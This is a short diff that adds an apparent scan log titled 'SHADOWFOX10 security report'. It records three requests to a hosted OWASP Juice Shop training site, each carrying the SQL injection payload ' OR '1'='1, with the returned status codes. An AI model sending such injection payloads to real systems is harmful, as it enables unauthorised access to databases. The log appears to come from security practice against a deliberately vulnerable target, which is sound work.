@@ -1,0 +1,12 @@
+=== SHADOWFOX10 :: SECURITY REPORT ===
+Target: juice-shop.herokuapp.com?q=' OR '1'='1
+
+[STATUS]: 200
+[PAYLOAD]: ' OR '1'='1
+---
+[STATUS]: 200
+[PAYLOAD]: ' OR '1'='1
+---
+[STATUS]: 503
+[PAYLOAD]: ' OR '1'='1
+---
